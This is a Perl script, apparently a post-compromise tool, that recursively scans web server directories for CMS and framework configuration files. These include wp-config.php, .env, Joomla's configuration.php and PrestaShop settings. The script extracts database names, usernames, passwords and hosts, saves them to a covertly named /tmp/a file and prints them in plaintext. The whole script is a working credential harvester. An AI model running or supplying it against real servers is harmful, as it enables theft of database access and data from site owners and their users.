#!/usr/bin/perl
# Universal CMS DB Extractor - Perl Version
# Usage: perl extract.pl [directory_path]

use strict;
use warnings;
use File::Find;
use File::Basename;
use File::Spec;

# Function to trim whitespace
sub trim {
    my $str = shift;
    $str =~ s/^\s+|\s+$//g;
    $str =~ s/^['"]|['"]$//g;
    return $str;
}

# Function to extract credentials from WordPress
sub extract_wp_config {
    my ($content) = @_;
    my %creds;
    
    if ($content =~ /define\s*\(\s*['"]DB_NAME['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]DB_USER['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]DB_PASSWORD['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]DB_HOST['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbhost} = trim($1);
    }
    if ($content =~ /\$table_prefix\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbprefix} = trim($1);
    }
    
    return %creds;
}

# Function to extract credentials from .env
sub extract_env {
    my ($content) = @_;
    my %creds;
    
    # Standard .env format
    if ($content =~ /^DB_DATABASE\s*=\s*(.*)$/m) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /^DB_USERNAME\s*=\s*(.*)$/m) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /^DB_PASSWORD\s*=\s*(.*)$/m) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /^DB_HOST\s*=\s*(.*)$/m) {
        $creds{dbhost} = trim($1);
    }
    
    # CodeIgniter 4 format
    if (!$creds{dbname} && $content =~ /^database\.default\.database\s*=\s*(.*)$/m) {
        $creds{dbname} = trim($1);
    }
    if (!$creds{dbuser} && $content =~ /^database\.default\.username\s*=\s*(.*)$/m) {
        $creds{dbuser} = trim($1);
    }
    if (!$creds{dbpass} && $content =~ /^database\.default\.password\s*=\s*(.*)$/m) {
        $creds{dbpass} = trim($1);
    }
    if (!$creds{dbhost} && $content =~ /^database\.default\.hostname\s*=\s*(.*)$/m) {
        $creds{dbhost} = trim($1);
    }
    
    return %creds;
}

# Function to extract credentials from Joomla configuration.php
sub extract_joomla {
    my ($content) = @_;
    my %creds;
    
    if ($content =~ /public\s+\$db\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /public\s+\$user\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /public\s+\$password\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /public\s+\$host\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbhost} = trim($1);
    }
    if ($content =~ /public\s+\$dbprefix\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbprefix} = trim($1);
    }
    
    return %creds;
}

# Function to extract credentials from CodeIgniter database.php
sub extract_codeigniter {
    my ($content) = @_;
    my %creds;
    
    if ($content =~ /\$db\['default'\]\['database'\]\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /\$db\['default'\]\['username'\]\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /\$db\['default'\]\['password'\]\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /\$db\['default'\]\['hostname'\]\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbhost} = trim($1);
    }
    if ($content =~ /\$db\['default'\]\['dbprefix'\]\s*=\s*['"]([^'"]+)['"]/i) {
        $creds{dbprefix} = trim($1);
    }
    
    return %creds;
}

# Function to extract credentials from PrestaShop
sub extract_prestashop {
    my ($content) = @_;
    my %creds;
    
    if ($content =~ /define\s*\(\s*['"]_DB_NAME_['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]_DB_USER_['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]_DB_PASSWD_['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]_DB_SERVER_['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbhost} = trim($1);
    }
    if ($content =~ /define\s*\(\s*['"]_DB_PREFIX_['"]\s*,\s*['"]([^'"]+)['"]\s*\)/i) {
        $creds{dbprefix} = trim($1);
    }
    
    return %creds;
}

# Function to extract credentials from generic PHP config
sub extract_generic {
    my ($content) = @_;
    my %creds;
    
    if ($content =~ /(?:database|dbname|db_name)\s*[:=]\s*['"]?([a-zA-Z0-9_-]+)['"]?/i) {
        $creds{dbname} = trim($1);
    }
    if ($content =~ /(?:username|user|dbuser|db_user)\s*[:=]\s*['"]?([a-zA-Z0-9_-]+)['"]?/i) {
        $creds{dbuser} = trim($1);
    }
    if ($content =~ /(?:password|pass|dbpass|db_password)\s*[:=]\s*['"]?([^'"]+)['"]?/i) {
        $creds{dbpass} = trim($1);
    }
    if ($content =~ /(?:host|dbhost|db_host|hostname)\s*[:=]\s*['"]?([^'"]+)['"]?/i) {
        $creds{dbhost} = trim($1);
    }
    
    return %creds;
}

# Main processing function
sub process_file {
    my ($file) = @_;
    my %creds;
    my $cms = "Unknown";
    
    # Skip if file is too large (>5MB)
    my $size = -s $file;
    return if $size > 5242880;
    
    # Open and read file
    open my $fh, '<', $file or return;
    local $/ = undef;
    my $content = <$fh>;
    close $fh;
    
    my $filename = basename($file);
    my $detect_cms = 0;
    
    # Process based on filename
    if ($filename eq 'wp-config.php') {
        %creds = extract_wp_config($content);
        $cms = "WordPress" if %creds;
        $detect_cms = 1;
    }
    elsif ($filename eq '.env') {
        %creds = extract_env($content);
        if ($content =~ /LARAVEL/i) {
            $cms = "Laravel";
        } elsif ($content =~ /CODEIGNITER/i) {
            $cms = "CodeIgniter 4";
        } else {
            $cms = "Generic .env";
        }
        $detect_cms = 1;
    }
    elsif ($filename eq 'configuration.php') {
        %creds = extract_joomla($content);
        $cms = "Joomla" if %creds;
        $detect_cms = 1;
    }
    elsif ($filename eq 'settings.inc.php') {
        %creds = extract_prestashop($content);
        $cms = "PrestaShop" if %creds;
        $detect_cms = 1;
    }
    elsif ($filename eq 'database.php') {
        %creds = extract_codeigniter($content);
        if (%creds) {
            $cms = "CodeIgniter 3";
        } else {
            # Try Laravel format
            if ($content =~ /'database'\s*=>\s*'([^']+)'/i) {
                %creds = extract_generic($content);
                $cms = "Laravel" if %creds;
            }
        }
        $detect_cms = 1;
    }
    elsif ($filename =~ /^(config\.php|config\.inc\.php|db\.php|connection\.php|constants\.php)$/) {
        %creds = extract_generic($content);
        
        # Detect specific CMS
        if ($content =~ /moodle/i) {
            $cms = "Moodle";
        } elsif ($content =~ /drupal/i) {
            $cms = "Drupal";
        } elsif ($file =~ /codeigniter/i) {
            $cms = "CodeIgniter";
        } else {
            $cms = "Generic PHP";
        }
        $detect_cms = 1;
    }
    
    # If not detected yet, try generic extraction
    if (!$detect_cms && !%creds) {
        %creds = extract_generic($content);
        if (%creds) {
            $cms = "Generic PHP (auto-detected)";
        }
    }
    
    # Output if we have at least database name and username
    if ($creds{dbname} && $creds{dbuser}) {
        return {
            cms => $cms,
            file => $filename,
            path => $file,
            dbname => $creds{dbname},
            dbuser => $creds{dbuser},
            dbpass => $creds{dbpass} || '',
            dbhost => $creds{dbhost} || 'localhost',
            dbprefix => $creds{dbprefix} || ''
        };
    }
    
    return undef;
}

# Main script
my $scan_dir = shift || getcwd();

# Check if directory exists
unless (-d $scan_dir) {
    die "Error: Directory '$scan_dir' does not exist!\n";
}

my $output_file = "/tmp/a";
open my $out_fh, '>', $output_file or die "Cannot create output file: $!";

print "[*] Scanning for database credentials in: $scan_dir ...\n";
print "[*] Searching for database configuration files...\n\n";

my @results;
my $found_count = 0;

# Find and process files
find(sub {
    return unless -f $_;
    
    my $filename = $_;
    
    # Check if file matches patterns
    my @patterns = (
        'wp-config\.php$', '\.env$', 'config\.inc\.php$', 'configuration\.php$',
        'config\.php$', 'parameters\.php$', 'settings\.inc\.php$', 'env\.php$',
        'local\.xml$', 'database\.php$', 'databases\.php$', 'db\.php$',
        'connection\.php$', 'constants\.php$', 'config\.yml$', 'config\.yaml$',
        'application\.php$'
    );
    
    my $matched = 0;
    foreach my $pattern (@patterns) {
        if ($filename =~ /$pattern/i) {
            $matched = 1;
            last;
        }
    }
    
    return unless $matched;
    
    my $full_path = File::Spec->rel2abs($_);
    my $result = process_file($full_path);
    
    if ($result) {
        $found_count++;
        push @results, $result;
        
        print "✓ Found: $$result{cms} credentials in $$result{file}\n";
        
        # Write to file
        print $out_fh "[FOUND #$found_count] CMS: $$result{cms}\n";
        print $out_fh "File       : $$result{file}\n";
        print $out_fh "Path       : $$result{path}\n";
        print $out_fh "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        print $out_fh "📁 Database : $$result{dbname}\n";
        print $out_fh "👤 Username : $$result{dbuser}\n";
        print $out_fh "🔑 Password : $$result{dbpass}\n";
        print $out_fh "🌐 Host     : $$result{dbhost}\n";
        print $out_fh "📊 Prefix   : $$result{dbprefix}\n" if $$result{dbprefix};
        print $out_fh "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    }
}, $scan_dir);

close $out_fh;

print "\n" . "=" x 60 . "\n";
print "[✓] Extraction completed!\n";
print "[✓] Results saved to: $output_file\n";
print "[✓] Total database configurations found: $found_count\n";

if ($found_count > 0) {
    print "\n[!] CREDENTIALS SUMMARY:\n";
    print "-" x 60 . "\n";
    
    foreach my $result (@results) {
        print "\n📌 $$result{cms}\n";
        print "   Database: $$result{dbname}\n";
        print "   Username: $$result{dbuser}\n";
        print "   Password: $$result{dbpass}\n";
        print "   Host: $$result{dbhost}\n";
    }
}

exit 0;
